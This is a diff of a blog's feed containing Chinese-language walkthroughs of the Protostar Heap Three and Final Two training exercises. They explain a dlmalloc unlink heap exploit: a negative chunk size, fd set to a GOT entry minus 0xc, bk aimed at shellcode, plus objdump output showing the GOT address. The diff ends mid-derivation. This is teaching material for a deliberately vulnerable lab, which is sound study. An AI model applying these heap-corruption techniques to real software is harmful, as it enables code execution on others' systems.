-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;free b: nothing happenf&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;free a: nothing happend&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;复习一下，我们想用 &lt;code&gt;unlink&lt;/code&gt; 的话用&lt;/p&gt;
-&lt;p&gt;在这里，unlink 对双链表中的 &lt;em&gt;上/下一个不在使用的 chunk&lt;/em&gt; 的判断依据是：&lt;/p&gt;
+&lt;p&gt;本来想自己写例子的，但想想 Protostar 已经提供了那么好的题目那就用他们的吧x&lt;/p&gt;
+&lt;h3 id=&#34;unlink-previous&#34;&gt;Unlink previous&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_heap_3&#34; &gt;Protostar Heap Three Walkthrough&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;unlink-next&#34;&gt;Unlink next&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_final_2&#34; &gt;Protostar Final Two Walkthrough&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;source-code-of-free&#34;&gt;Source code of free()&lt;/h2&gt;
+&lt;details&gt;
+&lt;summary&gt;展开...&lt;/summary&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;  -------------------- free ----------------------
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
@@ -589,7 +611,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;</description>
         </item>
         <item>
         <title>Protostar Final 2 Walkthrough</title>
@@ -792,7 +814,11 @@ buf = &amp;#34;abcdROOTadcd/&amp;#34;
 memmove(start, p, l)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;到这个地方我们大概就可以知道，可以利用这一点把 &lt;code&gt;start&lt;/code&gt; 移动到当前栈帧向前的任意 &lt;code&gt;/&lt;/code&gt;处，&lt;code&gt;memmove(start, p, l)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;然后再利用 &lt;code&gt;int get_requests(int fd)&lt;/code&gt; 的 &lt;code&gt;free(destroylist[i])&lt;/code&gt;！&lt;/p&gt;
-&lt;p&gt;这就是那个 &lt;code&gt;unlink()&lt;/code&gt; 的漏洞了，和 &lt;a class=&#34;link&#34; href=&#34;/p/protostar_heap_3&#34; &gt;Protostar Heap Three Walkthrough&lt;/a&gt; 是同样的思路w&lt;/p&gt;
+&lt;p&gt;这就是那个 &lt;code&gt;unlink()&lt;/code&gt; 的漏洞了，&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink 漏洞，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln&#34; &gt;Dlmalloc Unlink Vulnerability&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;请看完那篇后再继续向下看&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;br&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;restriction&#34;&gt;Restriction&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;int get_requests(int fd)&lt;/code&gt; 中有两句很讨厌的话：&lt;/p&gt;
@@ -816,95 +842,35 @@ memmove(start, p, l)
 &lt;/ol&gt;
 &lt;p&gt;以上两点不满足的话不会执行 &lt;code&gt;check_path(buf + 4)&lt;/code&gt; 也就不会执行里面的那句 &lt;code&gt;memmove(start, p, l)&lt;/code&gt;；也不会 &lt;code&gt;buf++&lt;/code&gt; 然后被 &lt;code&gt;free()&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;unlink&#34;&gt;Unlink&lt;/h2&gt;
-&lt;p&gt;接下来就可以考虑一下 &lt;code&gt;unlink()&lt;/code&gt; 了，先复习一下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/unlink.png&#34;
-	width=&#34;1364&#34;
-	height=&#34;1206&#34;
-	srcset=&#34;/p/protostar_final_2/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_480x0_resize_box_3.png 480w, /p/protostar_final_2/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;when unlink&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;113&#34;
-		data-flex-basis=&#34;271px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define unlink( P, BK, FD ) {           
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;		&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;           
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;		\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;                
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;4.&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;                       
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;堆中一个已被 free 的 chunk 的模型&lt;/th&gt;
-&lt;th&gt;指针（↑表示在一格的起始处）&lt;/th&gt;
-&lt;th&gt;大小&lt;/th&gt;
-&lt;th&gt;可以视作&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;prev_size&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;↑ chunk begins (P)&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x0&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;size&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x4&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;fd&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;↑ mem begins&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x8&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;bk&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0xc&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;→&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;→&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;→&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;4.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;→&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;即，当&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;时，&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里有两个注意点：&lt;/p&gt;
+&lt;p&gt;接下来就可以考虑一下 &lt;code&gt;unlink()&lt;/code&gt; 了，&lt;/p&gt;
+&lt;p&gt;这道题的顺序是：&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;&lt;code&gt;P-&amp;gt;fd+0xc&lt;/code&gt; = &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 所以 在&lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 写地址的话要减去 &lt;code&gt;0xc&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;P-&amp;gt;bk+0x8&lt;/code&gt; = &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 所以 &lt;code&gt;P-&amp;gt;bk+0x8&lt;/code&gt; 的位置会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 的值，那么 shellcode 需要从 &lt;code&gt;P-&amp;gt;bk+0xc&lt;/code&gt; 开始（以及之前全部填充上 NOP（NOP: 无操作））&lt;/li&gt;
+&lt;li&gt;创建 chunkA&lt;/li&gt;
+&lt;li&gt;创建 chunkB&lt;/li&gt;
+&lt;li&gt;释放 chunkA&lt;/li&gt;
+&lt;li&gt;释放 chunkB&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/whenunlink.png&#34;
-	width=&#34;1340&#34;
-	height=&#34;1032&#34;
-	srcset=&#34;/p/protostar_final_2/whenunlink_hued83a0bb44fa474b7e07bf4e8de140d2_183652_480x0_resize_box_3.png 480w, /p/protostar_final_2/whenunlink_hued83a0bb44fa474b7e07bf4e8de140d2_183652_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;when unlink&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;129&#34;
-		data-flex-basis=&#34;311px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;那么很明显，chunkA 先于 chunkB 释放，这是一道「向后 &lt;code&gt;unlink()&lt;/code&gt;」题&lt;/p&gt;
+&lt;p&gt;必须满足的条件：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;不是 fastbin（已满足）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不是通过 mmap 分配（已满足）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;aChunk&lt;/em&gt; 的 &lt;em&gt;相邻下一个 chunk&lt;/em&gt; 并不是最后堆中的最后一个&lt;br&gt;
+且，&lt;em&gt;aChunk&lt;/em&gt; 的 &lt;em&gt;相邻下一个 chunk&lt;/em&gt; 的 &lt;em&gt;再相邻下一个 chunk&lt;/em&gt; 的 &lt;code&gt;PREV_INUSE&lt;/code&gt; 为否&lt;br&gt;
+(也就相当于 &lt;em&gt;aChunk&lt;/em&gt; 的 &lt;em&gt;相邻下一个 chunk&lt;/em&gt; 不在被使用)&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;=&amp;gt; 会对 &lt;em&gt;aChunk&lt;/em&gt; 的 &lt;em&gt;相邻下一个 chunk&lt;/em&gt; 执行 &lt;code&gt;unlink()&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由于 REQSZ 设定为 128，大于 80 所以不会使用 fastbin&lt;/p&gt;
+&lt;p&gt;由于先释放的是 chunkA，那么就利用到了 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#next-chunks-next-chunks-prev_inuse&#34; &gt;next chunk&amp;rsquo;s next chunk&amp;rsquo;s prev_inuse&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节&lt;/p&gt;
+&lt;p&gt;建议先看完再继续&lt;/p&gt;
+&lt;p&gt;直接说结论的话，我们只要把 chunkB 的 size 覆盖为 &lt;code&gt;0xfffffffc = -0x4&lt;/code&gt; 就能满足第三个条件&lt;/p&gt;
+&lt;p&gt;另外，prev_size 也会被覆盖，为了区分就使用 &lt;code&gt;0xfffffff8 = -0x8&lt;/code&gt; 好了&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;可以开始考虑一下 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 和 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 要写什么了&lt;/p&gt;
 &lt;p&gt;比如把某个可怜的函数指向动态链接表里的值指向堆上的某段 shellcode&amp;hellip;这道题里似乎只能选择这个 &lt;code&gt;write()&lt;/code&gt;&lt;/p&gt;
@@ -919,72 +885,52 @@ memmove(start, p, l)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们弄出两个堆帧，那么执行顺序是：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;write()&lt;/li&gt;
-&lt;li&gt;free(chunkB)&lt;/li&gt;
-&lt;li&gt;write()&lt;/li&gt;
 &lt;li&gt;free(chunkA)&lt;/li&gt;
+&lt;li&gt;write()&lt;/li&gt;
+&lt;li&gt;free(chunkB)&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;在 &lt;code&gt;2. free(chunkB)&lt;/code&gt; 的时候我们就已经通过 unlink 覆写了 write 指向的地址
-那么在 &lt;code&gt;4. free(chunkA)&lt;/code&gt; 之前 shellcode 就已经执行了&lt;/p&gt;
-&lt;p&gt;则：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nop&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;p&gt;在 &lt;code&gt;2. free(chunkA)&lt;/code&gt; 的时候我们就已经通过 unlink 覆写了 write 指向的地址
+那么在 &lt;code&gt;4. free(chunkB)&lt;/code&gt; 之前 shellcode 就已经执行了&lt;/p&gt;
+&lt;br&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:~$ objdump -R /opt/protostar/bin/final2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep write
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d41c R_386_JUMP_SLOT   write
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d468 R_386_JUMP_SLOT   fwrite
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:~$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套用 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#vulnerability-unlink&#34; &gt;Vulnerability: unlink&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的公式：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of write - 0xc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;那么
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们所想要的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fd + &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们必须得纳入考虑并避免的：
